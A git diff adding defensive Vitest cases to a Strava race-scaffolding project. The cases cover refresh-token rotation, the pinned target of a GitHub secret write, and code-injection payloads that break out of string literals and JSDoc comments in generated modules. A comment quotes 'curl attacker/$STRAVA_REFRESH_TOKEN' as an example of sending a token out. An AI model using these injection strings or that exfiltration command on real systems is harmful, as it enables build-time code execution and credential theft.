@@ -1,9 +1,13 @@
+import {execFileSync} from "node:child_process";
+import {readFileSync, readdirSync} from "node:fs";
+import {pathToFileURL} from "node:url";
+
 import {afterEach, describe, expect, it, vi} from "vitest";
 
 import {accessToken, canReachTheTruth} from "../scripts/strava-auth.mjs";
 import {
-    calendarDate, commentSafe, distinctIds, editOrderNote, hms, modulesOn, orderedByStart,
-    raceSpanSeconds, recordingsFrom, renderModule, slugify, sportOf,
+    activityId, calendarDate, commentSafe, distinctIds, editOrderNote, hms, modulesOn,
+    orderedByStart, raceSpanSeconds, recordingsFrom, renderModule, slugify, sportOf, titlesFrom,
 } from "../scripts/scaffold-race.mjs";
 /**
  * IMPORTED FOR ITS SIDE EFFECT OF BEING PARSED AND EVALUATED, which is the only static
@@ -218,6 +222,121 @@ describe("the shared Strava credential path", () => {
         vi.stubGlobal("fetch", tokenResponse({message: "Authorization Error"}));
         await expect(accessToken(ENV)).rejects.toThrow("no access_token");
     });
+
+    /**
+     * A DROPPED ROTATION USED TO BE INDISTINGUISHABLE FROM AN ORDINARY NIGHT.
+     *
+     * The guard was one expression — `typeof body.refresh_token === "string" && body.refresh_token
+     * !== refreshToken` — so a response that omitted the field, or returned it as a number or an
+     * object, simply failed the condition and the function RETURNED THE ACCESS TOKEN. It failed
+     * closed on writing and open on returning success, which is the worst pairing available: if
+     * Strava had in fact rotated, both stores were left holding a spent credential and nothing
+     * was thrown, logged, or otherwise noticed until the bot failed at 05:13 some later night
+     * with a message about a bad refresh token and no clue where it came from.
+     *
+     * THE THREE SHAPES ARE ASSERTED SEPARATELY because they fail the old guard for two different
+     * reasons and a `toThrow` on one of them says nothing about the others. `access_token` is
+     * refused the same way four lines up in the module; this is that treatment applied to the
+     * quieter half.
+     */
+    it("treats a 200 with no usable refresh_token as a failure, rather than dropping a rotation", async () => {
+        for (const returned of [{}, {refresh_token: 1234}, {refresh_token: {value: "r"}}]) {
+            vi.stubGlobal("fetch", tokenResponse({access_token: "at", ...returned}));
+            await expect(accessToken(ENV), `${JSON.stringify(returned)} was accepted`)
+                .rejects.toThrow(/no usable refresh_token/);
+        }
+    });
+
+    /**
+     * WHERE THE CREDENTIAL COPY GOES, PINNED — because it is the one value in `.env.op` that is
+     * not an address of something to READ.
+     *
+     * That file's header frames its contents as "REFERENCES, NOT VALUES", and for the `op://`
+     * lines that is exactly right: an address is not a secret. `STRAVA_SECRET_REPO` is different
+     * in kind. It is the `-R` argument of `gh secret set STRAVA_REFRESH_TOKEN`, so it names the
+     * DESTINATION OF A CREDENTIAL WRITE, and a wrong value here hands this repository's Strava
+     * token to whatever repository the string points at.
+     *
+     * IT IS NOT A FINDING and this assertion does not pretend otherwise: `gh secret set` needs
+     * the authenticated account to hold admin on the target, and anyone who can land an edit to
+     * `.env.op` can land `curl attacker/$STRAVA_REFRESH_TOKEN` beside it. What it buys is that
+     * the value cannot drift by accident — a rename, a fork, a copy-paste from another project —
+     * for three lines.
+     *
+     * THE WRITERS ARE DISCOVERED, NOT LISTED. A third script that learns to write this secret is
+     * found by the capability it uses rather than by being remembered here, which is the same
+     * rule `tests/dns-config.test.ts` applies to jobs that can write DNS.
+     */
+    it("pins the repository a credential is copied to, on every path that copies one", () => {
+        const env = Object.fromEntries(
+            readFileSync(".env.op", "utf8")
+                .split("\n")
+                .filter((line) => /^[A-Z][A-Z0-9_]*=/.test(line))
+                .map((line) => {
+                    const at = line.indexOf("=");
+                    return [line.slice(0, at), line.slice(at + 1).replace(/^"|"$/g, "")];
+                }),
+        );
+        expect(env.STRAVA_SECRET_REPO, "the destination of a credential write is not this repository")
+            .toBe("calvindotsg/portfolio-v2");
+
+        const writers = readdirSync("scripts")
+            .filter((f) => f.endsWith(".mjs"))
+            .filter((f) => /"secret",\s*"set"/.test(readFileSync(`scripts/${f}`, "utf8")));
+        expect(writers.length, "no script writes a GitHub secret, so this case is vacuous")
+            .toBeGreaterThan(0);
+        for (const file of writers) {
+            const source = readFileSync(`scripts/${file}`, "utf8");
+            expect(source, `${file} writes a secret without reading STRAVA_SECRET_REPO for its -R`)
+                .toMatch(/required\(env,\s*"STRAVA_SECRET_REPO"\)/);
+        }
+    });
+});
+
+/**
+ * IMPORTING A SCRIPT MUST CHANGE NOTHING OUTSIDE IT — the property `commentSafe` and
+ * `activityId` hold for GENERATED modules, asked of the scripts that generate them.
+ *
+ * THIS IS NOT HYPOTHETICAL AND NOTHING ELSE CAUGHT IT. While plan 031 was being executed, a
+ * docblock added to `scripts/scaffold-race.mjs` quoted the JSDoc-breakout payload PLAINLY. That
+ * closed the comment it was written inside, and the words after it — `globalThis.P3=1;` —
+ * stopped being prose and became a TOP-LEVEL STATEMENT in the script. The text that followed
+ * reopened a comment, so the delimiters balanced and the file still parsed. MEASURED:
+ * `node --check` passed, `pnpm check` reported 0 errors, `pnpm eslint` was silent, and the whole
+ * suite was green, while importing the module set a global. The defect this plan exists to close,
+ * committed into the fix for it.
+ *
+ * THE PROBE RUNS IN A FRESH NODE PROCESS, AND THAT IS THE LOAD-BEARING PART. The obvious version
+ * — snapshot `globalThis`, `await import()`, diff — was written first and was GREEN ON THE LIVE
+ * DEFECT: this file imports two of these scripts at its own top, so by the time any case runs the
+ * global has ALREADY been set and appears in the "before" snapshot. A cache-busting query does
+ * not help, because the pollution predates the case rather than the import. Only a scope that
+ * never loaded these modules can answer the question, and a child process is the cheapest one.
+ *
+ * Every script guards its own `main` on `process.argv[1]`, which `-e` leaves undefined, so a
+ * probe imports the module without running the program. DISCOVERED FROM THE DIRECTORY, never
+ * listed: a script added tomorrow is covered the day it lands.
+ */
+describe("the scripts themselves", () => {
+    it("has no script whose import writes to module scope", () => {
+        const scripts = readdirSync("scripts").filter((f) => f.endsWith(".mjs"));
+        expect(scripts.length, "no scripts were found, so this case is vacuous").toBeGreaterThan(0);
+        for (const file of scripts) {
+            const url = pathToFileURL(`scripts/${file}`).href;
+            const probe = [
+                "const before = new Set(Object.keys(globalThis));",
+                `await import(${JSON.stringify(url)});`,
+                "const added = Object.keys(globalThis).filter((k) => !before.has(k));",
+                "process.stdout.write(JSON.stringify(added));",
+            ].join("\n");
+            const added = JSON.parse(
+                execFileSync(process.execPath, ["--input-type=module", "-e", probe], {encoding: "utf8"}),
+            ) as string[];
+            expect(added, `importing scripts/${file} added ${added.join(", ")} to the global scope. `
+                + "A comment that closes early puts the words after it at top level, and every "
+                + "other gate here reads that as prose.").toEqual([]);
+        }
+    });
 });
 
 describe("the race scaffold's arithmetic", () => {
@@ -405,6 +524,116 @@ describe("the race scaffold's output", () => {
         expect(comment.split("*/")).toHaveLength(2);
         // And the title is preserved rather than mangled: `\/` is JSON's own spelling of `/`.
         expect(JSON.parse(commentSafe(hostile))).toBe(hostile);
+    });
+
+    /**
+     * NEITHER FIELD THE SCAFFOLD COPIES RAW MAY CARRY CODE, and there are exactly two of them.
+     *
+     * The case above proves it of the activity TITLE, which `commentSafe` escapes. `metres` and
+     * `id` had no such defence: `metres` is emitted UNQUOTED, so a string value lands as an
+     * expression, and `id` is emitted inside a double-quoted literal AND again raw into the JSDoc
+     * block — three sinks between two fields. The generated module is loaded by
+     * `src/data/races/index.ts` with `import.meta.glob(..., {eager: true})`, so whatever reaches
+     * executable position there RUNS AT EVERY BUILD.
+     *
+     * MEASURED AGAINST UNFIXED CODE, not reasoned: each payload below was rendered, written to
+     * disk and imported, and each set its own global. The first is the nastiest of the three
+     * because it is INVISIBLE DOWNSTREAM — `metres: (globalThis.PWNED = 1, 17908.4)` evaluates to
+     * 17908.4, so `tests/data-contract.test.ts` reads a perfectly ordinary race.
+     *
+     * THE MIRROR CALLS `main`'s OWN TWO FUNCTIONS. `main` does I/O and a network call, so it
+     * cannot be invoked here — but `recordingsFrom` and `titlesFrom` are the whole of what it
+     * does with an activity, and a mirror that RE-IMPLEMENTED either would be asserting about
+     * itself. `titlesFrom` exists for this: the evidence line used to be a line inside `main`
+     * that nothing could reach, which is how an id got into a JSDoc block unchecked.
+     *
+     * A FOURTH PAYLOAD, `], EVIL, [`, IS DELIBERATELY ABSENT. It carries no quote character, so
+     * it cannot leave the string literal it is emitted into; it appeared in an audit draft and is
+     * not an injection. Asserting on it would assert that harmless text is harmless.
+     */
+    describe("cannot be made to write executable code out of an activity id or distance", () => {
+        const BASE = {
+            id: 12058884605, start_date: "2024-08-04T00:11:00Z", elapsed_time: 5321,
+            distance: 17908.4, name: "Morning Ride",
+        };
+        // `main`'s own two steps with an activity, in `main`'s own order.
+        const scaffolded = (activity: Record<string, unknown>) => renderModule({
+            date: "2024-08-04", sport: "cycling", elapsed_time: "1:28:41",
+            recordings: recordingsFrom([activity]),
+            titles: titlesFrom([activity]),
+            argv: [String(activity.id)],
+        });
+
+        const PAYLOADS = [
+            {
+                what: "a `distance` that is an expression rather than a number",
+                activity: {...BASE, distance: "(globalThis.PWNED = 1, 17908.4)"},
+                injected: "globalThis.PWNED",
+            },
+            {
+                what: "an `id` that closes the recording row's string literal",
+                activity: {...BASE, id: '1", metres: (globalThis.INJECTED_ROW = 1, 5), z: "'},
+                injected: "globalThis.INJECTED_ROW",
+            },
+            {
+                what: "an `id` that closes the module's JSDoc block",
+                activity: {...BASE, id: "1*/ globalThis.INJECTED_DOC = 1; /*"},
+                injected: "globalThis.INJECTED_DOC",
+            },
+        ];
+
+        for (const {what, activity, injected} of PAYLOADS) {
+            it(`refuses ${what}`, () => {
+                // REFUSED, NOT ESCAPED. A coerced or stripped value is a race that ships wrong
+                // figures quietly, which is worse than a scaffold that stops and says why.
+                expect(() => scaffolded(activity),
+                    `${injected} reached the generated module instead of being refused`).toThrow();
+                // And nothing rendered, so there is no second route to the same text.
+                let rendered = "";
+                try {
+                    rendered = scaffolded(activity);
+                } catch {
+                    rendered = "";
+                }
+                expect(rendered, "a module was written despite the refusal").not.toContain(injected);
+            });
+        }
+    });
+
+    /**
+     * THE ID SEAM ITSELF, ASKED DIRECTLY, BECAUSE THE CASES ABOVE CANNOT SEE IT ALONE.
+     *
+     * `main` reads an activity's id TWICE — once into a `recordings` row, once into the JSDoc
+     * evidence line — and the two reads live in two functions. A guard on only the first would
+     * still close the JSDoc case above, because the object literal `main` builds evaluates
+     * `recordings:` before `titles:` and the row guard would throw first — an ACCIDENT OF
+     * PROPERTY ORDER, not a defence. Reordering those two properties would take that case green
+     * over a live breakout.
+     *
+     * So the guard is asserted on its own, and on BOTH callers. MEASURED: reverting `titlesFrom`
+     * to `String(a.id)` leaves every other assertion in this repository green and reddens only
+     * the last line here.
+     */
+    it("validates an activity id once, for both the places it reaches generated source", () => {
+        expect(activityId({id: 12058884605}), "a real id is a decimal string, never a number")
+            .toBe("12058884605");
+        expect(activityId({id: "12058884605"})).toBe("12058884605");
+        for (const hostile of [
+            '1", metres: (globalThis.P = 1, 5), z: "',
+            "1*/ globalThis.P = 1; /*",
+            "], EVIL, [",
+            "",
+            "12058884605 ",
+            "1e3",
+            "-1",
+        ]) {
+            expect(() => activityId({id: hostile}), `${JSON.stringify(hostile)} was accepted as an id`)
+                .toThrow(/not a decimal Strava id/);
+            expect(() => recordingsFrom([{id: hostile, elapsed_time: 60, distance: 1000}]),
+                "the recordings seam let it through").toThrow(/not a decimal Strava id/);
+            expect(() => titlesFrom([{id: hostile, name: "Morning Ride"}]),
+                "the JSDoc evidence seam let it through").toThrow(/not a decimal Strava id/);
+        }
     });
 
     /**
